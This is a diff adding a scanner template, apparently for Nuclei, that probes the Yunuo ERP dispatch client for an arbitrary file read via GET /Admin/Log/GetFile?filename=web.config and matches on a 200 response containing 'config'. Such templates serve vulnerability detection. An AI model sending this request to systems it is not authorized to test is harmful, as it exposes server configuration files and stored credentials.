@@ -1,0 +1,24 @@
+id: yunuo-ERP-GetFile-fileread
+
+info:
+  name: 雨诺调度客户端 GetFile 存在任意文件读取漏洞
+  author: yunuo
+  severity: high
+  tags: yunuo,ERP,fileread
+
+http:
+  - raw:
+      - |
+        GET /Admin/Log/GetFile?filename=web.config HTTP/1.1
+        Host: {{Hostname}} 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'config'
+      - type: status
+        status: 
+          - 200
